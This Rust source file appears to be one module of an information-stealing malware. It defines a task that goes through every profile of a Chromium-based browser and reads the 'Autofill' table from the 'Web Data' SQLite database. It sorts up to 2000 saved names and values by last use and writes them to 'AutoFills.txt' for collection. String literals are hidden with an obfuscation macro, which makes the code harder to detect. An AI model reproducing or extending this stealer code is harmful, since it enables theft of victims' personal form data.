use alloc::boxed::Box;
use database::TableRecord;
use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::Path;
use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, AutoFill};
use crate::chromium::Browser;
use obfstr::obfstr as s;

const AUTOFILL_NAME: usize           = 0;
const AUTOFILL_VALUE: usize          = 1;
const AUTOFILL_DATE_LAST_USED: usize = 4;

pub(super) struct AutoFillTask {
    browser: Arc<Browser>,
}

impl AutoFillTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for AutoFillTask {
    parent_name!("AutoFills.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let Some(mut autofills) = collect_from_all_profiles(&self.browser.profiles, read_autofills) else {
            return
        };

        autofills.sort_by(|a, b| b.last_used.cmp(&a.last_used));
        autofills.truncate(2000);

        let _ = to_string_and_write_all(&autofills, "\n\n", parent);
    }
}

fn read_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
    let web_data_path = profile / s!("Web Data");
    read_sqlite3_and_map_records(&web_data_path, s!("Autofill"), extract_autofill_from_record)
}

fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
    let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
    let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
    let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();

    Some(AutoFill {
        name,
        value,
        last_used
    })
}